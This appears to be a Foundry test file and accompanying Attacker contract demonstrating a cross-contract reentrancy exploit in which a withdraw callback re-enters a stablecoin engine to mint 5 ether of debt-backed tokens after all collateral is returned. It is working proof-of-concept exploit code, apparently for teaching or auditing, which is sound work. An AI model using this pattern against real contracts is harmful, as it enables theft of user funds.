// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {CollateralVault, StablecoinEngine} from "../ReentrancyCrossContract.sol";
import {Attacker} from "./ReentrancyCrossContractTest.sol";

contract ReentrancyTest is Test {
    CollateralVault vault;
    StablecoinEngine engine;

    ERC20Mock collateral;
    ERC20Mock stablecoin;

    Attacker attacker;
    uint256 constant STARTING_BALANCE = 10 ether;

    function setUp() public {
        collateral = new ERC20Mock();
        stablecoin = new ERC20Mock();

        vault = new CollateralVault(address(collateral));
        engine = new StablecoinEngine(address(stablecoin), address(vault));

        vault.setEngine(address(engine));

        attacker = new Attacker(address(collateral), address(engine), address(vault));

        // Give the attacker collateral.
        collateral.mint(address(attacker), STARTING_BALANCE);
    }

    function testReentrancy() public {
    attacker.deposit(STARTING_BALANCE);

    console2.log("BEFORE ATTACK");
    console2.log("Attacker collateral:", vault.collateral(address(attacker)));
    console2.log("Attacker debt:", engine.debt(address(attacker)));
    console2.log("Vault token balance:", collateral.balanceOf(address(vault)));
    console2.log("Attacker token balance:", collateral.balanceOf(address(attacker)));
    console2.log("Attacker mUSD balance:", stablecoin.balanceOf(address(attacker)));

    attacker.withdraw(STARTING_BALANCE);

    console2.log("AFTER ATTACK");
    console2.log("Attacker collateral:", vault.collateral(address(attacker)));
    console2.log("Attacker debt:", engine.debt(address(attacker)));
    console2.log("Vault token balance:", collateral.balanceOf(address(vault)));
    console2.log("Attacker token balance:", collateral.balanceOf(address(attacker)));
    console2.log("Attacker mUSD balance:", stablecoin.balanceOf(address(attacker)));

    assertEq(vault.collateral(address(attacker)), 0);
    assertEq(collateral.balanceOf(address(attacker)), STARTING_BALANCE);
    assertEq(engine.debt(address(attacker)), 5 ether);
    assertEq(stablecoin.balanceOf(address(attacker)), 5 ether);
    }
}


pragma solidity ^0.8.34;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {StablecoinEngine, IWithdrawReceiver} from "../ReentrancyCrossContract.sol";

contract Attacker is IWithdrawReceiver {
    IERC20 public immutable collateralToken;
    StablecoinEngine public immutable engine;
    address public immutable vault;

    constructor(
        address _collateralToken,
        address _engine,
        address _vault
    ) {
        collateralToken = IERC20(_collateralToken);
        engine = StablecoinEngine(_engine);
        vault = _vault;
    }

    function deposit(uint256 amount) external {
        collateralToken.approve(vault, amount);
        engine.depositCollateral(amount);
    }

    function withdraw(uint256 amount) external {
        engine.withdrawCollateral(amount);
    }

    function onWithdraw(uint256 amount) external override {
        require(msg.sender == vault, "Only vault");

        // Re-enter the engine through a different function.
        engine.mintStablecoin(amount / 2);
    }
}